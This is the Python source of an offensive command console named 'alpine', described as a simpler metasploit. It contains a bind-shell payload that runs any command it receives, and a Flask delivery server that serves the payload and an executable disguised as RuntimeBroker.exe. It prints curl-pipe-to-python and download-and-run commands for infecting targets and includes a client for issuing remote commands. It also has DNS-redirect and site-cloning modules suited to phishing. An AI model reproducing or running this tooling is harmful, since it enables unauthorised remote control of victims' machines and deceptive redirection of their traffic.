import modules.plugin as plugin
from os import system
import threading
import logging
from time import sleep

log = logging.getLogger('werkzeug')
log.disabled = True

"""
TODO: make plugin 
"""

class colors:
    """
    Module made by @venaxyt on Github
    https://github.com/venaxyt/gratient
    """
    def sunset(text):
        system(""); faded = ""
        for line in text.splitlines():
            red = 0
            green = 0
            blue = 255
            for character in line:
                if not green > 200:
                    green += 3
                    red += 6
                    blue -= 4
                faded += (f"\033[38;2;{red};{green};{blue}m{character}\033[0m")
            faded += "\n"
        return faded

class essensials:
    def sanitized_input(string, q=False):
        """
        sanitized input to use
        """
        try:
            a = str(input(string))
        except:
            if q: sysVar.rsSite = False; print("\nctrl+c"); quit()
            else: return False
        return a

    def closeThread(thread):
        try:
            thread.exit()
            return True
        except:
            return False

class EndpointAction(object):
    """
    https://stackoverflow.com/questions/40460846/using-flask-inside-class

    line 74
    """

    def __init__(self, action, send="no"):
            
        self.action = action
        self.response = send

    def __call__(self, send="ok"):
        self.action()

        if self.response != "alpineCompiled":
            return self.response
        else:
            try:
                from flask import send_file
            except ImportError:
                print("[!] flask needed for this")
                return

            # MOST JANK SHIT IVE DONE
            return send_file('./dist/rs-windows.exe', download_name='RuntimeBroker.exe', as_attachment=True) # RuntimeBroker.exe is usually skipped over


class FlaskAppWrapper(object):
    """
    https://stackoverflow.com/questions/40460846/using-flask-inside-class

    i edited it and only god knows how it works
    """
    app = None

    def __init__(self, name):
        try:
            from flask import Flask, request
        except ImportError:
            print("[!] flask needed for this")
            return
            
        self.app = Flask(name)
        self.req = request
        self.flsk = Flask

    def shutdown(self):
        if sysVar.rsSite:
            if sysVar.rsAllow:
                sysVar.rsSite = not sysVar.rsSite
                if not sysVar.rsSiteNotified: print("[!!!] this will be depreciated eventually and i am working on a fix [!!!]"); sysVar.rsSiteNotified = True
                func = self.req.environ.get('werkzeug.server.shutdown')
                #func = sel
                if func is None:
                    raise RuntimeError('Not running with the Werkzeug Server')
                func()
            else:
                return
        else:
            return

    def winCompiled(self):
        """
        return windows compiled exe
        """
        return

    def run(self, port, ip):
        self.app.add_url_rule("/shutdown", "shutdown", EndpointAction(self.shutdown, send="ok"))
        self.app.add_url_rule("/windows", "windows", EndpointAction(self.winCompiled, send="alpineCompiled")) # END ME
        #self.app.add_url_rule("/windows", "windows", EndpointAction(self.win, send="ok"))

        try:
            self.app.run(ip, port=port, debug=False, use_reloader=False)
        except RuntimeError:
            pass

    def add_endpoint(self, endpoint=None, endpoint_name=None, handler=None, send="ok"):
        self.app.add_url_rule(endpoint, endpoint_name, EndpointAction(handler, send=handler()))

class modules:
    """
    built in scripts and stuff
    """
    class reverse_shell:
        def flaskThread(a, ip, port:int):
            process = threading.Thread(target=a.run, args=(port, ip,), daemon=True)
            process.start()


        def script():
            """
            python script
            """

            # temporary
            script = """
import socket
from subprocess import getoutput

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

skt.bind(("0.0.0.0", int(5354)))

skt.listen(1)

while True:
    conn, addr = skt.accept()

    with conn:
        while True:
            data = conn.recv(65536).decode('utf-8')

            if not data:
                print("not data")
                break

            if data == "alpine!die":
                quit()

            conn.send(getoutput(data).encode('utf-8'))
            """

            return script

        def stopFlask(args:list):
            """
            stop flask server
            """

            try:
                from httpx import get, RemoteProtocolError
            except ImportError:
                print("[!] httpx needed for this")
                return

            if sysVar.rsSite == True:
                sysVar.rsAllow = True

                sleep(0.5)

                try:
                    get("http://127.0.0.1:{}/shutdown".format(sysVar.rsSitePort), proxies={}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"})
                except RemoteProtocolError:
                    pass

                sleep(0.5)

                print("[-] closed site")
                sysVar.rsAllow = False
                return
            else:
                print("[!] flask server not running")


        def initDownload(args:list):
            """
            execute the download server for quick execution/injection
            """

            try:
                ip = args[1] # check if all variables are here
                port = args[2]

                sysVar.rsSitePort = port
            except:
                print("rs-download (server ip) (port)")
                return

            try:
                from httpx import get, RemoteProtocolError # import remoteprotocol error
                # remoteprotocolerror shows up when the server disconnects mid request
            except ImportError:
                print("[!] httpx needed for this")
                return

            if sysVar.rsSite == True:
                # site already running
                if input("[!] flask server already running; close it? [Y/n]").lower() == "y": 
                    # shutdown site server
                    sysVar.rsAllow = True # allow shutdown requests

                    sleep(.25) # wait a bit

                    try:
                        get("http://127.0.0.1:{}/shutdown".format(port), proxies={}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}) # make the shutdown request
                    except RemoteProtocolError:
                        pass

                    print("[-] closed site")
                    sysVar.rsAllow = False # disallow shutdown requests
                    sysVar.rsSitePort = None # remove site port
                    return
                else:
                    # choice was n or something else
                    return
                
            a = FlaskAppWrapper('wrap') # generate wrapper
            a.add_endpoint(endpoint='/', endpoint_name='script', handler=modules.reverse_shell.script) # add our script endpoint
            #a.add_endpoint(endpoint='/shutdown', endpoint_name='shutdown', handler=modules.reverse_shell.shutdown)s
            
            threading.Thread(target=modules.reverse_shell.flaskThread, args=(a, args[1], args[2],), daemon=True).start() # start flask thread

            print("[+] started flask download server!\n \
 | use \"curl http://{}:{}/ | python3\" to inject using python\n \
 | use \"curl http://{}:{}/windows -o rb.exe && rb.exe\" to inject using compiled exe\n  \
 \\ connect to client with their ip and the port 5354\n".format(ip, port, ip, port)) 

            sleep(.5) # wait a bit

            sysVar.rsSite = True # show that we're running the site

        def initSocket(args:list):
            """
            main TCP socket client
            """

            try:
                import socket
            except ImportError:
                print("[!] socket required for this")

            try:
                clientIP, clientP = args[1], args[2] # set our needed vars
            except:
                print("rs-probe (client ip) (client port)")

            mainSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # generate tcp socket
            mainSock.settimeout(5) # set timeout to 5 seconds

            try:
                mainSock.connect((clientIP, int(clientP))) # connect to client
            except socket.gaierror: # failed to connect
                print("[!] client ip doesnt exist")
                return
            except ConnectionRefusedError:
                print("[!] machine active, but was unable to connect")
                return

            print("connected; use \"alpine!die\" to full exit client's script; use ctrl+c to leave\n") # didnt fail

            while True: # do this forever
                try:
                    command = input("[{}:{}]> ".format(clientIP, clientP))

                    # if the command is to kill the client;
                    #                           V: send the packet to client            V: leave since client wont respond
                    if command == "alpine!die": mainSock.send(command.encode('utf-8')); return

                    mainSock.send(command.encode('utf-8'))
                except KeyboardInterrupt: # if input gives keyboard interrupt (i shouldnt nest all of this here but wtv)
                    print("\n\nctrl+c")
                    return

                try:
                    print(mainSock.recv(65536).decode('utf-8')) # attempt to recieve data
                except socket.timeout: # if timed out
                    print("timeout") # try again
            
    class dns:
        def start(args:list):
            """
            glorified "systemctl start dnsmasq"
            """
            try:
                import os
            except ImportError:
                print("[!] unable to import os")
            
            a = essensials.sanitized_input("[?] this plugin requires DNSMasq and runs it's daemon, confirm? [Y/n]").lower() # just in case you dont have dnsmasq

            if a == "y":
                os.system("systemctl restart dnsmasq") # restart because yes
                print("[!] started")
                return True
            else: # if n or anything else skip cuz invalid
                print("[X] skipped")
                return False

        def add_entry(args:list):
            """
            add a DNS redirect entry to dnsmasq
            """
            file_data = None # dnsmasq.conf filedata

            try:
                domain = args[1] # check if args needed are given
                ip = args[2]
            except IndexError:
                print("[!] not enough args; dns-entry (domain) (server redirect ip)")
                return False

            try:
                with open("/etc/dnsmasq.conf", "r") as f:
                    file_data = f.read().split("\n") # read and put in variable to use later
            except FileNotFoundError: # if dnsmasq.conf doesnt exist
                print("[!] /etc/dnsmasq.conf not found!") # notify
                return

            if "address {}/{}\n".format(domain, ip) in file_data: #sanity check
                print("[!] entry already added!")
                return
            
            try:
                with open("/etc/dnsmasq.conf", "a") as f:
                    f.write("address {}/{}\n".format(domain, ip))
                    f.flush() # add our entry
            except FileNotFoundError: # if dnsmasq.conf was deleted in those microseconds somehow
                print("[!] /etc/dnsmasq.conf not found!") # notify
                return

            print("[+] DNS entry added")

    class clone:
        def cloneSite(args:list):
            try:
                import httpx
            except ImportError: # httpx not available
                print("[!] HTTPX needed for this module; pip install httpx")
                return

            if args[3] != "0": # if proxy given
                proxy = {"http": args[3].split(":")} # set our proxy to that
            else:
                proxy = {} # empty

            try:
                with open(args[2], "w", encoding='utf-8') as f:
                    f.write(httpx.get(args[1], headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}, proxies=proxy).text) # make the request and instantly write to file
                    f.flush() # flush just in case
                print("success")
                return
            except IndexError: # VVVVVVV
                print("[!] not enough arguments; replicate (url) (output file) (proxy (0 for none))")

class sysVar:
    """
    system variables
    """
    modules = { # built in modules
        "dns": {
            "module": modules.dns.start,
            "help": "start DNSmasq daemon"
        },

        "dns-entry": {
            "module": modules.dns.add_entry,
            "help": "add a dns entry to the dns server"
        },

        "cloneSite": {
            "module": modules.clone.cloneSite,
            "help": "download a site's HTML"
        },

        "rs-download": {
            "module": modules.reverse_shell.initDownload,
            "help": "start http flask server to download file from"
        },

        "rs-probe": {
            "module": modules.reverse_shell.initSocket,
            "help": "probe to client ip and attempt to connect"
        },

        "rs-dstop": {
            "module": modules.reverse_shell.stopFlask,
            "help": "stop http flask server"
        },
    }

    runnable_plugins = [] # variable name
    rsSite = False # site running bool
    rsAllow = False # allow shutdown
    rsSitePort = None # set previously given site port
    rsSiteNotified = False # for the shutdown thing
    activeThreads = [] # variable name

if __name__ == "__main__":
    plugins = plugin.load(folder="modules") # load

    print(colors.sunset(r"""
                ___                                  
               /\_ \            __                   
           __  \//\ \    _____ /\_\    ___      __   
         /'__`\  \ \ \  /\ '__`\/\ \ /' _ `\  /'__`\ 
        /\ \L\.\_ \_\ \_\ \ \L\ \ \ \/\ \/\ \/\  __/ 
        \ \__/.\_\/\____\\ \ ,__/\ \_\ \_\ \_\ \____\
         \/__/\/_/\/____/ \ \ \/  \/_/\/_/\/_/\/____/
                           \ \_\                     
                            \/_/                     

    a more user friendly (but worse) version of metasploit
    """))

    for p in plugins[1]: # for plugin in plugins list
        for executable in plugins[1][p][1][0]: # for every executable in the plugin's executable list
            sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])] = {} # create dict

            try:
                sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])]["help"] = plugins[1][p][1][1][executable].strip() # define help
            except KeyError: # command's help not in configurationfile
                raise KeyError("\"{}\"'s command \"{}\" doesn't have a help key pair in it's configuration".format(plugins[1][p][0], executable))
            sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])]["module"] = None # set module as None to show it's not ours

    while True:
        c = essensials.sanitized_input("\nalpine#> ", q=False) # q=True to quit if ctrl+c

        if c == False:
            print("\nuse \"exit\" to leave alpine")
            continue

        elif c == "help":
            for module in sysVar.modules: # cycle through each
                a = sysVar.modules[module]['help'] # get all help from modules
                print(f"{module}: {a}")
                continue # go back to input

        elif c == "exit": quit()

        try:
            sysVar.modules[c.split(" ")[0]]["module"](c.split(" ")) # try getting it from built in modules
        except KeyError: # if not in modules:
            for p in plugins[1]: # for plugin in plugins list
                for executable in plugins[1][p][1][0]: # for every executable in the plugin's executable list
                    if c.split(' ')[0] == executable: # if our choice in plugin's executable path

                        try: # dont even know about this try except
                            plugin.function(c.split(' ')[0], c.split(' '), plugin=plugins[1][p][2]) # execute
                            # args:
                            # 1: the command / our choice, now being used to get the function
                            # 2: the args of the command
                            # 3: module to pull the function from
                        except:
                            raise # raise if error (no point)
